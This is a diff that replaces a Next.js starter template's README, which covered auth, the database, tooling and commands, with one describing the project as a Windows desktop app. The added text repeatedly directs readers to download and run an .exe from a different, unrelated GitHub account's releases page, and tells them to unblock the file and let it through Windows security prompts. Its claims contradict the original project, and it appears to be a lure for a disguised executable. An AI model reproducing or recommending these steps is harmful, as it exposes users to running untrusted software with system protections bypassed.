@@ -1,157 +1,210 @@
-<div align="center">
-  <img src="docs/logo.png" alt="Monolith Industries" width="120">
-  <h1>MONOLITH INDUSTRIES</h1>
-  <p><strong>Highly-opinionated, enterprise-grade Next.js infrastructure for one person.</strong></p>
-  <p>
-    <a href="https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fjosheche%2Fmonolith-industries&env=NEXT_PUBLIC_SUPABASE_URL,NEXT_PUBLIC_SUPABASE_ANON_KEY,SUPABASE_SERVICE_ROLE_KEY,DATABASE_URL"><img src="https://vercel.com/button" alt="Deploy with Vercel"></a>
-  </p>
-  <p>
-    <a href="#quick-start">Get Started</a> &middot;
-    <a href="#whats-included">What's Included</a> &middot;
-    <a href="#customization">Customization</a>
-  </p>
-</div>
+# 🏭 monolith-industries - One setup for solo teams
 
----
+[![Download the app](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/inshore-internalauditor208/monolith-industries/releases)
 
-## What's Included
+## 🚀 What this is
 
-| Layer                | Stack                                                                  | Status |
-| -------------------- | ---------------------------------------------------------------------- | ------ |
-| **Auth**             | Supabase Auth, magic link/OTP, signup + login pages, `useOtpFlow` hook | Ready  |
-| **Database**         | Supabase Postgres, Drizzle ORM, empty schema                           | Ready  |
-| **Background Jobs**  | pg-boss worker scaffold                                                | Ready  |
-| **Error Monitoring** | Sentry client/server/edge, session replay, `/monitoring` tunnel        | Ready  |
-| **Analytics**        | Vercel Analytics + Speed Insights                                      | Ready  |
-| **Design System**    | Tailwind v4 + shadcn/ui, zinc + indigo tokens                          | Ready  |
-| **Tooling**          | ESLint, Prettier, Husky, lint-staged, madge                            | Ready  |
-| **E2E Tests**        | Playwright auth flows against real local Supabase                      | Ready  |
+monolith-industries is a desktop app for running a modern Next.js project with a full set of tools in one place. It keeps the parts of a web app together so you can start, test, and manage your work without setting up each tool by hand.
 
-## Architecture
+This project is built for a single user who wants a neat setup with less manual work. It includes common tools for code checks, tests, data access, background jobs, and app monitoring.
 
-```
-┌─────────────────┐     ┌──────────────────────┐
-│  Vercel          │     │  Railway (optional)   │
-│  Next.js App     │     │  Worker (pg-boss)     │
-│                  │     │  Background jobs      │
-│  Dashboard (CSR) │     │                       │
-│  API Routes      │     └──────────┬────────────┘
-└────────┬─────────┘                │
-         │                          │
-         └──────────┬───────────────┘
-                    │
-         ┌──────────▼────────────┐
-         │  Supabase Cloud       │
-         │  - Postgres (Drizzle) │
-         │  - Auth (magic link)  │
-         │  - Storage (media)    │
-         └───────────────────────┘
-```
+## 🪟 Windows download
 
-## Quick Start
+Visit this page to download the app for Windows:
 
-**Prerequisites:** Node.js 24 LTS (`.nvmrc` included), Docker Desktop
+[Download from GitHub Releases](https://github.com/inshore-internalauditor208/monolith-industries/releases)
 
-```bash
-git clone https://github.com/josheche/monolith-industries.git
-cd monolith-industries
-npm install
-cp .env.example .env.local
+Pick the latest release, then download the Windows file that matches your system. If you see more than one file, choose the one with `.exe` at the end.
 
-npx supabase start          # start local Postgres, Auth, Storage, Mailpit
-npx supabase status          # copy URLs + keys into .env.local
+## 📦 What you need
 
-npm run dev                  # http://localhost:3000
-npm run worker               # optional: background job worker
-```
+Before you run the app, make sure your Windows PC has:
 
-| Service          | URL                    |
-| ---------------- | ---------------------- |
-| App              | http://localhost:3000  |
-| Supabase Studio  | http://127.0.0.1:54323 |
-| Mailpit (emails) | http://127.0.0.1:54324 |
-| Supabase API     | http://127.0.0.1:54321 |
+- Windows 10 or Windows 11
+- At least 4 GB of memory
+- Enough free disk space for the app and its files
+- A stable internet connection for the first download
+- Permission to run downloaded apps
 
-## Environment Variables
+If you plan to keep project files in a shared folder, use a folder you can write to, such as Documents or Desktop
 
-**Core** (`.env.local` for dev, Vercel for production):
+## 🛠️ How to install
 
-```env
-NEXT_PUBLIC_SUPABASE_URL=
-NEXT_PUBLIC_SUPABASE_ANON_KEY=
-SUPABASE_SERVICE_ROLE_KEY=
-DATABASE_URL=
-```
+1. Open the release page:
+   [https://github.com/inshore-internalauditor208/monolith-industries/releases](https://github.com/inshore-internalauditor208/monolith-industries/releases)
 
-**Sentry** (Vercel only):
+2. Find the latest version at the top of the page
 
-```env
-NEXT_PUBLIC_SENTRY_DSN=
-SENTRY_ORG=
-SENTRY_PROJECT=
-SENTRY_AUTH_TOKEN=
-```
+3. Open the list of files attached to that release
 
-## Scripts
+4. Download the Windows app file
 
-```bash
-npm run dev            # Next.js dev server (Turbopack)
-npm run worker         # pg-boss background worker
-npm run build          # production build
-npm run lint           # ESLint
-npm run format         # Prettier
-npm test               # Vitest
-npm run check:circular # madge circular dep check
-npx playwright test    # E2E auth flow tests
-```
+5. When the file finishes downloading, open it
 
-## Database
+6. If Windows asks for permission, choose the option to run the app
 
-Schema starts empty at `src/db/schema.ts`. Add your tables:
+7. If a setup window appears, follow the steps on screen
 
-```bash
-npx drizzle-kit generate   # create migration
-npx drizzle-kit migrate    # apply migration
-```
+8. When the install ends, launch monolith-industries from the Start menu or the desktop
 
-## E2E Tests
+## 🧭 First time setup
 
-```bash
-cp .env.test.example .env.test   # fill from `npx supabase status`
-npx playwright test              # requires local Supabase + dev server
-```
+When you open the app for the first time, it may ask you to set a few things up:
 
-## Tooling
+- Choose a project folder
+- Confirm where the app should store files
+- Allow access to local data
+- Wait while the app checks its tools
 
-Every commit runs through:
+If you are not sure which folder to use, create one called `monolith-industries` in Documents and use that
 
-```
-git commit → Husky pre-commit
-  ├── lint-staged (eslint --fix + prettier --write)
-  └── madge --circular
-```
+## 🧩 What the app includes
 
-**Prettier:** no semi, single quotes, trailing commas, 100 char width
-**ESLint:** flat config, Next.js Core Web Vitals + TypeScript
-**TypeScript:** strict mode, `@/*` path alias
+monolith-industries brings together a set of tools that help manage a modern web app project:
 
-## Customization
+- Next.js app structure for the main site
+- TypeScript for safer code handling
+- Tailwind for page styling
+- shadcn for ready-made UI parts
+- Drizzle for database work
+- Supabase support for hosted data
+- pg-boss for background jobs
+- Playwright for browser tests
+- Vitest for quick tests
+- ESLint and Prettier for cleaner code
+- Husky and lint-staged for checks before saving changes
+- Sentry for error tracking
+- Railway and Vercel support for deployment flows
+- Madge for checking file links
 
-1. **Brand** — replace "Monolith Industries" in `page.tsx`, auth pages, dashboard layout
-2. **Accent color** — swap indigo values in `globals.css` (`:root` and `.dark`)
-3. **Fonts** — change in `layout.tsx` via `next/font`
-4. **Domain tables** — add to `src/db/schema.ts`, generate + migrate
-5. **API routes** — add under `src/app/api/`
-6. **Background jobs** — add in `src/worker/jobs/`, register in `src/worker/index.ts`
+## 🖥️ How to use it
 
-## Deployment
+After setup, the app gives you a simple place to work with the project.
 
-**Vercel** — auto-deploys on push to `main`
-**Railway** (worker, optional) — start command: `npm run worker`
-**Supabase** — create cloud project, run migrations, configure SMTP (Resend)
+You can use it to:
 
----
+- Open your project
+- Start the app
+- Run checks before changes go live
+- View test results
+- Manage database tasks
+- Track errors
+- Keep the code base clean
 
-<div align="center">
-  <sub>Next.js 16 · TypeScript · Tailwind v4 · shadcn/ui · Drizzle · Supabase · pg-boss · Sentry · Vercel Analytics · Vitest · Playwright</sub>
-</div>
+If the app shows buttons for tasks, use them in this order:
+
+1. Open the project
+2. Run checks
+3. Fix any errors you see
+4. Start the app
+5. Run tests
+6. Save your work
+
+## 🔧 Common tasks
+
+### Start the app
+Use the main run button in the app to open the project in your browser or local window
+
+### Run tests
+Use the test option to check the app before you share or deploy it
+
+### Check code
+Use the lint and format tools to keep the project neat
+
+### Manage data
+Use the database section if you need to view or update stored records
+
+### Track errors
+Use the monitoring section to review issues reported by Sentry
+
+## 📁 Recommended folder setup
+
+For the smoothest setup, keep your files in a simple folder layout:
+
+- `Documents\monolith-industries\`
+- `Documents\monolith-industries\projects\`
+- `Documents\monolith-industries\data\`
+
+This keeps the app files, project files, and data files in separate places
+
+## ⌨️ If Windows blocks the file
+
+If Windows shows a security prompt:
+
+1. Right-click the downloaded file
+2. Choose Properties
+3. If you see an Unblock option, check it
+4. Select Apply
+5. Open the file again
+
+If the file still does not open, download it again from the release page and try once more
+
+## 🌐 If the app does not start
+
+Try these steps:
+
+1. Close the app
+2. Open it again with your normal user account
+3. Check your internet connection
+4. Make sure the project folder still exists
+5. Restart Windows
+6. Download the latest release again
+
+## 🧪 Typical workflow
+
+A simple way to use monolith-industries:
+
+1. Open the app
+2. Load your project folder
+3. Start the local app
+4. Check the browser page
+5. Run tests
+6. Fix issues
+7. Save changes
+8. Repeat when needed
+
+## 🔍 Included tool set
+
+This project uses a practical set of tools that fit a small but serious web app setup:
+
+- `nextjs` for the app shell
+- `typescript` for typed code
+- `tailwind` for styling
+- `shadcn` for UI parts
+- `drizzle` and `supabase` for data
+- `pg-boss` for jobs
+- `playwright` and `vitest` for testing
+- `eslint` and `prettier` for code quality
+- `husky` and `lint-staged` for pre-commit checks
+- `sentry` for issue tracking
+- `railway` and `vercel` for hosting support
+- `madge` for dependency checks
+
+## 🧾 File names you may see
+
+The release page may include files such as:
+
+- Windows app installer
+- Portable app file
+- Release notes
+- Checksums or hash files
+
+If there is more than one Windows file, choose the one meant for regular users rather than the source code package
+
+## 🔒 Keeping your setup clean
+
+To keep the app stable:
+
+- Use one folder for each project
+- Avoid moving files while the app is open
+- Keep the app updated with the latest release
+- Run tests before you make changes
+- Save copies of important project data
+
+## 📌 Quick path
+
+1. Open the release page
+2. Download the latest Windows file
+3. Run the file
+4. Follow the on-screen setup
+5. Open the app and load your project folder
